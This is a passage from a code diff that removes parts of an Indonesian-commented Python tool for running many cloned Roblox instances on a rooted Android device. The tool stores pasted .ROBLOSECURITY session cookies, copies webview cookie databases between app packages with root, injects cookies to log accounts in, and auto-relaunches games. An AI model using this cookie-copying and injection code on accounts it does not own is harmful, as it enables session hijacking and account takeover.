-            for i, cookie in enumerate(cookies, 1):
-                # Tampilkan preview cookie (awal + akhir)
-                if len(cookie) > 60:
-                    preview = cookie[:25] + "..." + cookie[-15:]
-                else:
-                    preview = cookie
-                print(f"  {i}. {preview}")
-            print("-" * 70)
-        else:
-            print("  (Belum ada cookie)")
-        print()
-
-        # Backup status
-        backup_status = "✅ Ready" if has_backup() else "❌ Belum ada"
-        print(f"📦 Backup session: {backup_status} ({BACKUP_DIR})")
-        print()
-
-        print("1. ➕ Add Cookie")
-        print("2. 🗑️ Delete Cookie")
-        print("3. ✅ Validate All Cookies")
-        print("4. 📦 Backup Session (dari package yang sudah login)")
-        print("0. ↩️ Back\n")
-
-        c = input("📌 Select: ").strip()
-
-        if c == "1":
-            # Add cookie
-            print()
-            print("Paste cookie .ROBLOSECURITY di bawah ini:")
-            print("(Format: _|WARNING:-DO-NOT-SHARE-THIS...)")
-            print()
-            new_cookie = input("🍪 Cookie: ").strip()
-            if not new_cookie:
-                add_log("❌ Cookie kosong, dibatalkan")
-                input("\nPress ENTER...")
-                continue
-
-            # Validasi format dasar
-            if len(new_cookie) < 50:
-                print("⚠️ Cookie terlalu pendek. Yakin ini benar? (y/n)")
-                confirm = input("> ").strip().lower()
-                if confirm != "y":
-                    continue
-
-            # Cek duplikat
-            if new_cookie in cookies:
-                add_log("⚠️ Cookie sudah ada di list")
-                input("\nPress ENTER...")
-                continue
-
-            # Validasi online (opsional)
-            print("\n🔍 Validating cookie...")
-            result = validate_cookie(new_cookie)
-            if result:
-                user_id, username = result
-                print(f"✅ Valid! User: {username} (ID: {user_id})")
-            else:
-                print("⚠️ Cookie tidak valid atau tidak bisa divalidasi")
-                print("   Tetap simpan? (y/n)")
-                confirm = input("> ").strip().lower()
-                if confirm != "y":
-                    continue
-
-            cookies.append(new_cookie)
-            save_cookies(cookies)
-            print(f"\n✅ Cookie #{len(cookies)} ditambahkan!")
-            input("\nPress ENTER...")
-
-        elif c == "2":
-            # Delete cookie
-            if not cookies:
-                add_log("❌ Tidak ada cookie untuk dihapus")
-                input("\nPress ENTER...")
-                continue
-
-            print()
-            idx = input(f"🗑️ Nomor cookie yang mau dihapus (1-{len(cookies)}): ").strip()
-            try:
-                idx = int(idx)
-                if 1 <= idx <= len(cookies):
-                    removed = cookies.pop(idx - 1)
-                    save_cookies(cookies)
-                    preview = removed[:30] + "..." if len(removed) > 30 else removed
-                    print(f"✅ Cookie #{idx} dihapus: {preview}")
-
-                    # Update cookie_map jika ada (adjust cookie indices)
-                    cmap = load_cookie_map()
-                    if cmap:
-                        new_map = {}
-                        deleted_cookie_idx = idx - 1
-                        for pkg_key, cookie_val in cmap.items():
-                            if cookie_val == deleted_cookie_idx:
-                                pass  # cookie ini dihapus, skip mapping
-                            elif cookie_val > deleted_cookie_idx:
-                                new_map[pkg_key] = cookie_val - 1
-                            else:
-                                new_map[pkg_key] = cookie_val
-                        save_cookie_map(new_map)
-                else:
-                    print("❌ Nomor tidak valid")
-            except ValueError:
-                print("❌ Input harus angka")
-            input("\nPress ENTER...")
-
-        elif c == "3":
-            # Validate all
-            if not cookies:
-                add_log("❌ Tidak ada cookie untuk divalidasi")
-                input("\nPress ENTER...")
-                continue
-
-            print("\n🔍 Validating all cookies...\n")
-            for i, cookie in enumerate(cookies, 1):
-                preview = cookie[:25] + "..." if len(cookie) > 25 else cookie
-                print(f"  [{i}] {preview} → ", end="", flush=True)
-                result = validate_cookie(cookie)
-                if result:
-                    user_id, username = result
-                    print(f"✅ {username} (ID: {user_id})")
-                else:
-                    print("❌ Invalid / Expired")
-            input("\nPress ENTER...")
-
-        elif c == "4":
-            # Backup session dari package yang sudah login
-            clear_screen()
-            print("=" * 70)
-            print("📦 BACKUP SESSION DATA")
-            print("=" * 70)
-            print()
-            print("Pilih package yang SUDAH LOGIN (punya akun Roblox aktif).")
-            print("Data session akan disimpan ke:", BACKUP_DIR)
-            print()
-
-            pkgs = load_packages()
-            if not pkgs:
-                print("❌ Belum ada package. Jalankan Auto Detect dulu.")
-                input("\nPress ENTER...")
-                continue
-
-            pkg_list = list(pkgs.items())
-            for i, (pkg, info) in enumerate(pkg_list):
-                username = info.get("username", "?")
-                db_check = run_root_cmd(f"ls /data/data/{pkg}/app_webview/Default/Cookies")
-                db_status = "✅ Has data" if db_check else "❌ No data"
-                print(f"  {i+1}. {username} ({pkg.split('.')[-1]}) — {db_status}")
-
-            print()
-            choice = input(f"📌 Pilih package (1-{len(pkg_list)}): ").strip()
-            try:
-                idx = int(choice) - 1
-                if 0 <= idx < len(pkg_list):
-                    pkg, info = pkg_list[idx]
-                    username = info.get("username", "?")
-                    print(f"\n📦 Backing up dari {username} ({pkg})...")
-
-                    # Force stop dulu
-                    run_root_cmd(f"am force-stop {pkg}")
-                    time.sleep(1)
-
-                    if backup_webview_from_pkg(pkg):
-                        print(f"\n✅ Backup berhasil!")
-                        print(f"📂 Lokasi: {BACKUP_DIR}/app_webview/")
-                        print(f"\nBackup ini akan dipakai otomatis saat Login Cookie")
-                        print(f"ke package yang belum punya data.")
-                    else:
-                        print(f"\n❌ Backup gagal!")
-                else:
-                    print("❌ Nomor tidak valid")
-            except ValueError:
-                print("❌ Input harus angka")
-            input("\nPress ENTER...")
-
-        elif c == "0":
-            break
-
-def login_cookies_menu():
-    """Menu Login Cookie — assign cookie ke package dan inject"""
-    while True:
-        clear_screen()
-        cookies = load_cookies()
-        pkgs = load_packages()
-        cmap = load_cookie_map()
-
-        print("=" * 70)
-        print("🔑 LOGIN COOKIE")
-        print("=" * 70)
-
-        if not cookies:
-            print("\n❌ Belum ada cookie! Tambahkan dulu di menu Manage Cookies.")
-            input("\nPress ENTER...")
-            return
-
-        if not pkgs:
-            print("\n❌ Belum ada package! Jalankan Auto Detect dulu.")
-            input("\nPress ENTER...")
-            return
-
-        # Tampilkan status mapping
-        print(f"\n🍪 Cookies: {len(cookies)} | 📦 Packages: {len(pkgs)}")
-        print()
-        print(f"{'No':<4} {'Package':<25} {'Cookie':<20} {'Status':<20}")
-        print("-" * 70)
-
-        pkg_list = list(pkgs.items())
-        for i, (pkg, info) in enumerate(pkg_list):
-            pkg_short = pkg.split('.')[-1][:23]
-            username = info.get("username", "?")
-
-            # Cek apakah ada cookie yang di-assign
-            cookie_idx = cmap.get(str(i))
-            if cookie_idx is not None and cookie_idx < len(cookies):
-                cookie_preview = cookies[cookie_idx][:15] + "..."
-                status = f"🍪 Cookie #{cookie_idx + 1}"
-            else:
-                cookie_preview = "-"
-                status = "⚪ No cookie"
-
-            print(f"{i+1:<4} {username:<25} {cookie_preview:<20} {status:<20}")
-
-        print("-" * 70)
-        print()
-
-        print("1. 🔄 Auto Assign (cookie 1→pkg 1, cookie 2→pkg 2, ...)")
-        print("2. 🎯 Manual Assign (pilih cookie untuk package tertentu)")
-        print("3. 🚀 Login All (inject semua cookie yang sudah di-assign)")
-        print("4. 🚀 Login Satu Package")
-        print("0. ↩️ Back\n")
-
-        c = input("📌 Select: ").strip()
-
-        if c == "1":
-            # Auto assign
-            new_map = {}
-            count = min(len(cookies), len(pkg_list))
-            for i in range(count):
-                new_map[str(i)] = i
-            save_cookie_map(new_map)
-            add_log(f"✅ Auto-assigned {count} cookie(s) ke {count} package(s)")
-            print(f"\n✅ {count} cookie di-assign secara berurutan!")
-            if len(cookies) < len(pkg_list):
-                print(f"⚠️ Cookie kurang! {len(pkg_list) - len(cookies)} package tanpa cookie.")
-            elif len(cookies) > len(pkg_list):
-                print(f"ℹ️ {len(cookies) - len(pkg_list)} cookie tidak terpakai (lebih dari jumlah package).")
-            input("\nPress ENTER...")
-
-        elif c == "2":
-            # Manual assign
-            print()
-            pkg_num = input(f"📦 Nomor package (1-{len(pkg_list)}): ").strip()
-            try:
-                pkg_idx = int(pkg_num) - 1
-                if 0 <= pkg_idx < len(pkg_list):
-                    cookie_num = input(f"🍪 Nomor cookie (1-{len(cookies)}): ").strip()
-                    cookie_idx = int(cookie_num) - 1
-                    if 0 <= cookie_idx < len(cookies):
-                        cmap[str(pkg_idx)] = cookie_idx
-                        save_cookie_map(cmap)
-                        pkg_name = pkg_list[pkg_idx][1].get("username", "?")
-                        print(f"\n✅ Cookie #{cookie_idx+1} → {pkg_name}")
-                    else:
-                        print("❌ Nomor cookie tidak valid")
-                else:
-                    print("❌ Nomor package tidak valid")
-            except ValueError:
-                print("❌ Input harus angka")
-            input("\nPress ENTER...")
-
-        elif c == "3":
-            # Login all — inject + launch (hanya buka app, tidak masuk game)
-            if not cmap:
-                print("\n❌ Belum ada cookie yang di-assign! Pilih opsi 1 atau 2 dulu.")
-                input("\nPress ENTER...")
-                continue
-
-            print("\n🚀 Injecting cookies + launching semua package...\n")
-            success = 0
-            fail = 0
-            for pkg_idx_str, cookie_idx in cmap.items():
-                pkg_idx = int(pkg_idx_str)
-                if pkg_idx >= len(pkg_list):
-                    continue
-                if cookie_idx >= len(cookies):
-                    continue
-
-                pkg, info = pkg_list[pkg_idx]
-                username = info.get("username", "?")
-                cookie = cookies[cookie_idx]
-
-                print(f"  [{pkg_idx+1}] {username} ← Cookie #{cookie_idx+1}... ", end="", flush=True)
-                if inject_cookie_to_pkg(pkg, cookie, launch_after=True):
-                    print("✅ Injected + Launched")
-                    success += 1
-                else:
-                    print("❌")
-                    fail += 1
-
-                # Delay antar package agar tidak overload
-                if success + fail < len(cmap):
-                    time.sleep(3)
-
-            print(f"\n📊 Result: {success} success, {fail} failed")
-            input("\nPress ENTER...")
-
-        elif c == "4":
-            # Login satu package — inject + launch (hanya buka app)
-            print()
-            pkg_num = input(f"📦 Nomor package (1-{len(pkg_list)}): ").strip()
-            try:
-                pkg_idx = int(pkg_num) - 1
-                if 0 <= pkg_idx < len(pkg_list):
-                    cookie_idx = cmap.get(str(pkg_idx))
-                    if cookie_idx is not None and cookie_idx < len(cookies):
-                        pkg, info = pkg_list[pkg_idx]
-                        username = info.get("username", "?")
-                        cookie = cookies[cookie_idx]
-                        print(f"\n🚀 Injecting Cookie #{cookie_idx+1} → {username} + Launch...")
-                        if inject_cookie_to_pkg(pkg, cookie, launch_after=True):
-                            print("✅ Injected + Launched!")
-                        else:
-                            print("❌ Failed!")
-                    else:
-                        print("❌ Package ini belum di-assign cookie. Pilih opsi 1 atau 2 dulu.")
-                else:
-                    print("❌ Nomor package tidak valid")
-            except ValueError:
-                print("❌ Input harus angka")
-            input("\nPress ENTER...")
-
-        elif c == "0":
-            break
-
-# =========================
-# ROBLOX APP CONTROL
-# =========================
-def is_app_running(package):
-    out = run_root_cmd(f"pidof {package}")
-    return bool(out.strip())
-
-def start_app(package, game_id):
-    intent = f"am start -n {package}/com.roblox.client.ActivityProtocolLaunch -d roblox://placeID={game_id}"
-    run_root_cmd(intent)
-
-def stop_app(package):
-    run_root_cmd(f"am force-stop {package}")
-
-# =========================
-# PKG SERVER CONFIG (Menu 12)
-# =========================
-def load_pkg_servers():
-    """Load per-pkg server config dari pkg_servers.json"""
-    if not os.path.exists(PKG_SERVERS_FILE):
-        return {}
-    try:
-        with open(PKG_SERVERS_FILE) as f:
-            return json.load(f)
-    except:
-        return {}
-
-def save_pkg_servers(data):
-    """Simpan per-pkg server config ke pkg_servers.json"""
-    try:
-        with open(PKG_SERVERS_FILE, "w") as f:
-            json.dump(data, f, indent=2)
-    except Exception as e:
-        add_log(f"❌ Gagal save pkg_servers: {e}")
-
-def parse_server_input(raw, default_game_id):
-    """
-    Parse input user:
-    - Kosong / enter → gunakan config game_id (default)
-    - Angka saja    → game_id berbeda
-    - URL roblox    → private link, extract game_id dari URL
-    Returns: (game_id, private_link_or_empty)
-    """
-    import re
-    if not raw or not raw.strip():
-        return default_game_id, ""
-
-    raw = raw.strip()
-
-    # Cek apakah URL roblox (private link)
-    if "roblox.com" in raw or "ro.blox.com" in raw:
-        game_id_match = re.search(r'/games/(\d+)', raw)
-        game_id = game_id_match.group(1) if game_id_match else default_game_id
-        return game_id, raw
-
-    # Cek apakah angka saja (game_id lain)
-    if raw.isdigit():
-        return raw, ""
-
-    # Format roblox deep link: roblox://placeID=xxx
-    deep_match = re.search(r'placeID=(\d+)', raw)
-    if deep_match:
-        return deep_match.group(1), ""
-
-    # Tidak dikenali → pakai default
-    add_log(f"⚠️ Input tidak dikenali, pakai default game_id")
-    return default_game_id, ""
-
-def start_app_2step(package, game_id, private_link=""):
-    """
-    Launch Roblox 2 step seperti pc.py:
-    Step 1: Launch ActivitySplash (splash screen)
-    Step 2: Launch ActivityProtocolLaunch dengan game_id atau private_link
-    """
-    import re
-
-    # Step 1: Splash / launcher fallback
-    splash_cmds = [
-        f"am start -n {package}/com.roblox.client.startup.ActivitySplash",
-        f"am start -n {package}/.startup.ActivitySplash",
-        f"monkey -p {package} -c android.intent.category.LAUNCHER 1"
-    ]
-
-    splash_started = False
-    for i, splash in enumerate(splash_cmds):
-        add_log(f"🚀 Launch attempt {i+1}: {splash[:60]}...")
-        run_root_cmd(splash)
-        time.sleep(3)
-        if is_app_running(package):
-            splash_started = True
-            add_log(f"✅ {package} started with method {i+1}")
-            break
-
-    if not splash_started:
-        add_log(f"⚠️ All splash methods tried for {package}, continuing anyway...")
-
-    time.sleep(8)
-
-    # Step 2: Protocol launch
-    if private_link:
-        # Extract game_id dan private code dari link
-        game_id_match = re.search(r'/games/(\d+)', private_link)
-        link_game_id = game_id_match.group(1) if game_id_match else game_id
-
-        private_code = None
-        if "privateServerLinkCode=" in private_link:
-            m = re.search(r'privateServerLinkCode=([^&]+)', private_link)
-            if m:
-                private_code = m.group(1)
-        elif "share?code=" in private_link or "code=" in private_link:
-            m = re.search(r'code=([^&]+)', private_link)
-            if m:
-                private_code = m.group(1)
-
-        if private_code:
-            intent = (
-                f"am start -n {package}/com.roblox.client.ActivityProtocolLaunch "
-                f"-d \"roblox://placeID={link_game_id}&privateServerLinkCode={private_code}\""
-            )
-        else:
-            # Private link tapi tidak ada code → launch biasa dengan game_id dari link
-            intent = (
-                f"am start -n {package}/com.roblox.client.ActivityProtocolLaunch "
-                f"-d roblox://placeID={link_game_id}"
-            )
-    else:
-        intent = (
-            f"am start -n {package}/com.roblox.client.ActivityProtocolLaunch "
-            f"-d roblox://placeID={game_id}"
-        )
-
-    run_root_cmd(intent)
-
-def get_pkg_launch_params(pkg, cfg):
-    """
-    Dapatkan (game_id, private_link) untuk pkg tertentu.
-    Prioritas: pkg_servers.json > config game_id
-    """
-    servers = load_pkg_servers()
-    if pkg in servers:
-        entry = servers[pkg]
-        return entry.get("game_id", cfg.get("game_id", "")), entry.get("private_link", "")
-    return cfg.get("game_id", ""), ""
-
-def configure_server_per_pkg():
-    """Menu 12 — Konfigurasi server per-pkg (game_id atau private link)"""
-    pkgs = load_packages()
-    cfg  = load_config()
-
-    if not pkgs:
-        print("❌ Tidak ada packages terdaftar. Daftar dulu di menu 3.")
-        input("Press ENTER...")
-        return
-
-    default_game_id = cfg.get("game_id", "")
-    servers = load_pkg_servers()
-
-    pkg_list = list(pkgs.items())
-
-    print("\n" + "=" * 60)
-    print("🌐 ADD SERVER — Konfigurasi Server Per Package")
-    print("=" * 60)
-    print(f"Default Game ID (dari config): {default_game_id}")
-    print()
-    print("Untuk setiap package, isi:")
-    print("  • Enter saja       → pakai default game_id dari config")
-    print("  • Angka (game_id)  → game berbeda untuk pkg ini")
-    print("  • URL roblox       → private server link untuk pkg ini")
-    print()
-
-    # Tanya apakah untuk semua pkg atau manual
-    print("Apply ke semua package sama? (y/n, default=n): ", end="")
-    all_same = input().strip().lower()
-
-    if all_same == "y":
-        print(f"\nIsi untuk SEMUA package (Enter = default {default_game_id}): ", end="")
-        raw = input().strip()
-        gid, plink = parse_server_input(raw, default_game_id)
-
-        for pkg, info in pkg_list:
-            if gid == default_game_id and not plink:
-                # Hapus override, kembali ke default
-                servers.pop(pkg, None)
-            else:
-                servers[pkg] = {"game_id": gid, "private_link": plink}
-
-        save_pkg_servers(servers)
-        print()
-        for pkg, info in pkg_list:
-            label = f"Private ({gid})" if plink else f"Game ID {gid}"
-            print(f"  ✅ {info['username']} → {label}")
-        print("\n✅ Semua package diupdate.")
-
-    else:
-        # Manual per pkg
-        for pkg, info in pkg_list:
-            username = info["username"]
-            current = servers.get(pkg, {})
-            cur_gid   = current.get("game_id", default_game_id)
-            cur_plink = current.get("private_link", "")
-
-            if cur_plink:
-                cur_label = f"Private link (game {cur_gid})"
-            elif cur_gid != default_game_id:
-                cur_label = f"Game ID {cur_gid}"
-            else:
-                cur_label = f"Default ({default_game_id})"
-
-            print(f"\n[{username}] Current: {cur_label}")
-            print(f"  Enter = pakai default, angka = game_id lain, URL = private link")
-            print(f"  Input: ", end="")
-            raw = input().strip()
-
-            gid, plink = parse_server_input(raw, default_game_id)
-
-            if gid == default_game_id and not plink:
-                servers.pop(pkg, None)
-                print(f"  → Reset ke default ({default_game_id})")
-            else:
-                servers[pkg] = {"game_id": gid, "private_link": plink}
-                if plink:
-                    print(f"  → Private server (game {gid})")
-                else:
-                    print(f"  → Game ID {gid}")
-
-        save_pkg_servers(servers)
-        print("\n✅ Konfigurasi server disimpan.")
-
-    input("\nPress ENTER untuk kembali ke menu...")
-
-
-
-# =========================
-# JSON WORKSPACE MONITORING (seperti PC version)
-# =========================
-def get_workspace_json_path(package_info, username, cfg):
-    """Mendapatkan path workspace JSON"""
-    workspace_dir = package_info.get("workspace_dir",
-                     f"/storage/emulated/0/Android/data/com.roblox.client/files/gloop/external/Workspace")
-    try:
-        os.makedirs(workspace_dir, exist_ok=True)
-    except Exception:
-        pass
-    return f"{workspace_dir}/{username}{cfg['json_suffix']}"
-
-def get_json_time_diff(package_info, username, cfg):
-    """
-    Mendapatkan selisih waktu sejak JSON terakhir update
-    Returns: float (seconds) atau None jika JSON tidak ada
-    """
-    json_path = get_workspace_json_path(package_info, username, cfg)
-
-    if not os.path.exists(json_path):
-        return None
-
-    try:
-        with open(json_path, 'r') as f:
-            raw = f.read()
-        if not raw.strip():
-            return None
-        data = json.loads(raw)
-
-        timestamp_field = None
-        for field in ["timestamp", "time", "last_update", "updated_at"]:
-            if field in data:
-                timestamp_field = data[field]
-                break
-
-        if timestamp_field:
-            if isinstance(timestamp_field, (int, float)):
-                json_time = timestamp_field
-            elif isinstance(timestamp_field, str):
-                if "T" in timestamp_field and "Z" in timestamp_field:
-                    dt_str = timestamp_field.replace("Z", "+00:00")
-                    dt = datetime.fromisoformat(dt_str)
-                    json_time = dt.timestamp()
-                else:
-                    return None
-            else:
-                return None
-            return time.time() - json_time
-        else:
-            mtime = os.path.getmtime(json_path)
-            return time.time() - mtime
-
-    except (json.JSONDecodeError, ValueError, OSError):
-        return None
-    except Exception:
-        return None
-
-def check_json_running(package_info, username, cfg):
-    """
-    Check apakah JSON sedang berjalan (< 60 detik seperti PC version)
-    """
-    time_diff = get_json_time_diff(package_info, username, cfg)
-    
-    if time_diff is None:
-        return False
-    
-    return time_diff <= 60
-
-def determine_account_status(pkg, package_info, cfg):
-    """
-    Menentukan status akun berdasarkan logika PC version:
-    - offline: Client tidak berjalan
-    - waiting: Launch baru, menunggu first check
-    - in_game: JSON aktif
-    - needs_kill: JSON tidak aktif setelah melewati first check / grace period
-    """
-    username = package_info["username"]
-    
-    # Initialize state jika belum ada
-    if pkg not in ACCOUNT_STATE:
-        ACCOUNT_STATE[pkg] = {
-            "launch_time": None,
-            "json_start_time": None,
-            "json_active": False,
-            "last_status": "offline"
-        }
-    
-    acc = ACCOUNT_STATE[pkg]
-    
-    # 1. Jika client tidak berjalan → OFFLINE
-    if not is_app_running(pkg):
-        # Reset semua timer saat offline
-        acc["json_active"] = False
-        acc["json_start_time"] = None
-        acc["last_status"] = "offline"
-        return "offline"
-    
-    # 2. Client berjalan, cek JSON
-    json_running = check_json_running(package_info, username, cfg)
-    current_time = time.time()
-    first_check_seconds = cfg["first_check"] * 60
-    
-    # 3. Jika JSON berjalan
-    if json_running:
-        # Update JSON timer setiap kali JSON aktif (PENTING!)
-        acc["json_active"] = True
-        acc["json_start_time"] = current_time
-        acc["last_status"] = "in_game"
-        return "in_game"
-    
-    # 4. JSON tidak berjalan - cek kondisi
-    launch_time = acc.get("launch_time")
-    json_active = acc.get("json_active", False)
-    json_start_time = acc.get("json_start_time")
-    
-    # 4a. Jika baru launch, masih dalam grace period → WAITING
-    if launch_time is not None:
-        time_since_launch = current_time - launch_time
-        if time_since_launch < first_check_seconds:
-            acc["last_status"] = "waiting"
-            return "waiting"
-    
-    # 4b. Jika JSON pernah aktif tapi sekarang mati (hop server, dll)
-    if json_active and json_start_time is not None:
-        ingame_check_seconds = cfg.get("ingame_check", 2) * 60  # pakai ingame_check, bukan first_check
-        time_since_json_stop = current_time - json_start_time
-        if time_since_json_stop >= ingame_check_seconds:
-            acc["last_status"] = "needs_kill"
-            return "needs_kill"
-        else:
-            acc["last_status"] = "in_game"
-            return "in_game"
-    
-    # 4c. Launch sudah lama, JSON belum pernah aktif → NEEDS KILL
-    if launch_time is not None:
-        time_since_launch = current_time - launch_time
-        if time_since_launch >= first_check_seconds:
-            acc["last_status"] = "needs_kill"
-            return "needs_kill"
-    
-    # 4d. Kondisi tidak jelas → WAITING
-    acc["last_status"] = "waiting"
-    return "waiting"
-
-# =========================
-# DISPLAY - TABEL RAPI + LOG ROLLING
-# =========================
-def display_monitor_screen(pkgs, cfg):
-    clear_screen()
-
-    print("=" * 80)
-    print(" " * 30 + "🎮 ROBLOX OVA MONITOR")
-    print("=" * 80)
-    print()
-
-    print(f"{'No':<4} {'Username':<16} {'Package':<22} {'Status':<30}")
-    print("-" * 80)
-
-    all_in_game = True
-    for i, (pkg, info) in enumerate(pkgs.items(), 1):
-        username = info["username"]
-        pkg_short = pkg.split('.')[-1][:20]
-
-        if pkg not in ACCOUNT_STATE:
-            ACCOUNT_STATE[pkg] = {
-                "launch_time": None,
-                "json_start_time": None,
-                "json_active": False,
-                "last_status": "offline"
-            }
-
-        try:
-            status = determine_account_status(pkg, info, cfg)
-        except Exception:
-            status = "offline"
-
-        if status == "in_game":
-            try:
-                time_diff = get_json_time_diff(info, username, cfg)
-            except Exception:
-                time_diff = None
-            if time_diff is not None:
-                status_display = f"🟢 In Game | JSON: {int(time_diff)}s"
-            else:
-                status_display = "🟢 In Game"
-        elif status == "offline":
-            status_display = "⚫ Offline"
-            all_in_game = False
-        elif status == "waiting":
-            launch_time = ACCOUNT_STATE[pkg].get("launch_time")
-            if launch_time:
-                first_check_seconds = cfg["first_check"] * 60
-                remaining = max(0, int(first_check_seconds - (time.time() - launch_time)))
-                status_display = f"🟡 Waiting ({remaining}s)"
-            else:
-                status_display = "🟡 Waiting"
-            all_in_game = False
-        elif status == "needs_kill":
-            status_display = "🔴 JSON Dead - Killing"
-            all_in_game = False
-        else:
-            status_display = f"❓ {status}"
-            all_in_game = False
-
-        username_display = username[:14] if len(username) <= 14 else username[:13] + "."
-        status_display = status_display[:28] if len(status_display) <= 28 else status_display[:27] + "."
-
-        print(f"{i:<4} {username_display:<16} {pkg_short:<22} {status_display:<30}")
-
-    print("-" * 80)
-    timestamp = time.strftime('%H:%M:%S')
-    status_text = "✅ ALL IN GAME" if all_in_game else "❌ NEEDS ATTENTION"
-    print(f"🕒 {timestamp} | 📦 Total: {len(pkgs)} | {status_text}")
-    print("=" * 80)
-    print()
-
-    print("📋 CONSOLE LOG:")
-    print("-" * 80)
-    if LOG_BUFFER:
-        for log_line in LOG_BUFFER:
-            print(log_line)
-    else:
-        print("[No logs yet]")
-    print("-" * 80)
-    print()
-
-# =========================
-# SEQUENTIAL STARTUP
-# =========================
-def sequential_startup(pkgs, cfg):
-    """Startup semua package secara sequential"""
-    success_count = 0
-
-    add_log("=" * 40)
-    add_log("STOPPING ALL EXISTING INSTANCES")
-    add_log("=" * 40)
-
-    for pkg, info in pkgs.items():
-        if is_app_running(pkg):
-            stop_app(pkg)
-            if pkg in ACCOUNT_STATE:
-                ACCOUNT_STATE[pkg]["launch_time"] = None
-                ACCOUNT_STATE[pkg]["json_start_time"] = None
-                ACCOUNT_STATE[pkg]["json_active"] = False
-
-    time.sleep(cfg["restart_delay"] * 2)
-
-    # Hitung bounds freeform jika enabled
-    freeform_enabled = cfg.get("freeform_enabled", False)
-    per_row = cfg.get("windows_per_row", 2)
-    total = len(pkgs)
-    win_w, win_h, screen_w, screen_h = get_window_size(cfg, total)
-
-    # Load cookie map untuk auto-inject
-    cookies = load_cookies()
-    cmap = load_cookie_map()
-    pkg_list_keys = list(pkgs.keys())
-
-    for i, (pkg, info) in enumerate(pkgs.items(), 1):
-        username = info["username"]
-
-        add_log(f"Starting {i}/{len(pkgs)}: {username}")
-
-        # Auto-inject cookie jika ada mapping
-        pkg_idx = pkg_list_keys.index(pkg)
-        cookie_idx = cmap.get(str(pkg_idx))
-        if cookie_idx is not None and cookie_idx < len(cookies):
-            add_log(f"🍪 Injecting cookie #{cookie_idx+1} → {username}")
-            inject_cookie_to_pkg(pkg, cookies[cookie_idx])
-
-        col = (i - 1) % per_row
-        row = (i - 1) // per_row
-        bounds = calc_bounds(i - 1, per_row, win_w, win_h)
-        add_log(f"📐 Bounds: {bounds}")
-
-        start_app_2step(pkg, *get_pkg_launch_params(pkg, cfg))
-
-        ACCOUNT_STATE.setdefault(pkg, {})
-        ACCOUNT_STATE[pkg]["launch_time"] = time.time()
-        ACCOUNT_STATE[pkg]["json_active"] = False
-        ACCOUNT_STATE[pkg]["json_start_time"] = None
-
-        time.sleep(cfg["startup_delay"])
-
-        max_wait = cfg["first_check"] * 60 + 30
-        start_time = time.time()
-
-        while (time.time() - start_time) < max_wait:
-            status = determine_account_status(pkg, info, cfg)
-
-            if status == "in_game":
-                add_log(f"✅ {username} is IN GAME")
-                success_count += 1
-                break
-            elif status == "needs_kill":
-                add_log(f"❌ {username} FAILED (JSON dead)")
-                break
-
-            time.sleep(cfg["workspace_check_interval"])
-        else:
-            add_log(f"⏱️ {username} TIMEOUT waiting")
-
-        if i < len(pkgs):
-            time.sleep(3)
-
-    add_log("=" * 40)
-    add_log(f"📊 RESULTS: {success_count}/{len(pkgs)} accounts in game")
-    add_log("=" * 40)
-
-    return success_count
-
-# =========================
-# FREEFORM WINDOW ARRANGER
-# =========================
-def get_screen_size():
-    """Ambil resolusi layar dari wm size"""
-    try:
-        out = run_root_cmd("wm size")
-        for line in out.splitlines():
-            if "size:" in line.lower():
-                part = line.split(":")[-1].strip()
-                # Handle "Override size" vs "Physical size"
-                if " " in part:
-                    part = part.split()[-1]
-                w, h = part.split("x")
-                return int(w), int(h)
-    except Exception:
-        pass
-    return 1080, 1920  # fallback
-
-
-def calc_bounds(index, per_row, win_w, win_h, gap_h=35, gap_v=35):
-    """
-    Hitung bounds (left, top, right, bottom).
-    Konsep sama seperti pc.py:
-      x = col * win_w
-      y = row * (win_h + title_bar_height)
-    title_bar_height masuk ke dalam perkalian row,
-    sehingga jarak antar semua baris selalu konsisten.
-    gap_h tidak digunakan (window horizontal rapat).
-    """
-    title_bar_height = 30
-    col    = index % per_row
-    row    = index // per_row
-    left   = col * win_w
-    top    = row * (win_h + title_bar_height)
-    right  = left + win_w
-    bottom = top  + win_h
-    return left, top, right, bottom
-
-
-def get_window_size(cfg, total_pkgs):
-    """
-    Hitung ukuran window berdasarkan config.
-    - use_fixed_size=True  → pakai window_width x window_height dari config (seperti arrage.py Fixed Size)
-    - use_fixed_size=False → bagi rata: win_w = screen_w // per_row, win_h = screen_h // rows
-    Returns: (win_w, win_h, screen_w, screen_h)
-    """
-    screen_w, screen_h = get_screen_size()
-    per_row = cfg.get("windows_per_row", 2)
-
-    if cfg.get("use_fixed_size", False):
-        win_w = cfg.get("window_width", 540)
-        win_h = cfg.get("window_height", 960)
-    else:
-        rows  = max(1, (total_pkgs + per_row - 1) // per_row)
-        win_w = screen_w // per_row
-        win_h = screen_h // rows
-
-    return win_w, win_h, screen_w, screen_h
-
-
-def arrange_roblox_windows(cfg, pkgs=None):
-    """
-    Arrange semua window Roblox - gabungkan semua metode.
-    Method 1: am task resize (paling umum)
-    Method 2: am task resize --task --bounds (format alternatif)
-    Method 3: wm set-multi-window-position (Android 14+)
-    Method 4: am start --launch-bounds --activity-single-top (tanpa kill)
-    Method 5: am task move-to-front lalu resize ulang
-    """
-    import re
-    if pkgs is None:
-        pkgs = load_packages()
-    if not pkgs:
-        add_log("❌ No packages found")
-        return
-
-    per_row = cfg.get("windows_per_row", 2)
-    total   = len(pkgs)
-    win_w, win_h, screen_w, screen_h = get_window_size(cfg, total)
-    game_id = cfg.get("game_id", "")
-
-    size_mode = "Fixed" if cfg.get("use_fixed_size", False) else "Auto"
-    add_log(f"📐 [{size_mode}] {win_w}x{win_h} | {per_row}/row")
-
-    # ── Parsing taskId dari dumpsys ───────────────────────────────────
-    dump = run_root_cmd("dumpsys activity activities")
-    pkg_task = {}
-    current_task = None
-
-    for line in dump.splitlines():
-        s = line.strip()
-        m = re.match(r'Task id #(\d+)', s)
-        if not m:
-            m = re.match(r'\*?\s*Task\{[^\}]*#(\d+)', s)
-        if m:
-            current_task = m.group(1)
-            continue
-        if current_task:
-            for pkg in pkgs.keys():
-                if pkg in s and pkg not in pkg_task:
-                    pkg_task[pkg] = current_task
-
-    add_log(f"🔍 Tasks: {pkg_task}")
-
-    for i, (pkg, info) in enumerate(pkgs.items()):
-        username = info["username"]
-        task_id  = pkg_task.get(pkg)
-
-        left, top, right, bottom = calc_bounds(i, per_row, win_w, win_h)
-        add_log(f"→ {username} task={task_id} ({left},{top},{right},{bottom})")
-
-        if not task_id:
-            add_log(f"⚠️ {username}: task not found, skip")
-            continue
-
-        # ── Step 1: Force task masuk freeform stack (stack id 5) ──────
-        # Wajib dilakukan agar am task resize bisa bekerja
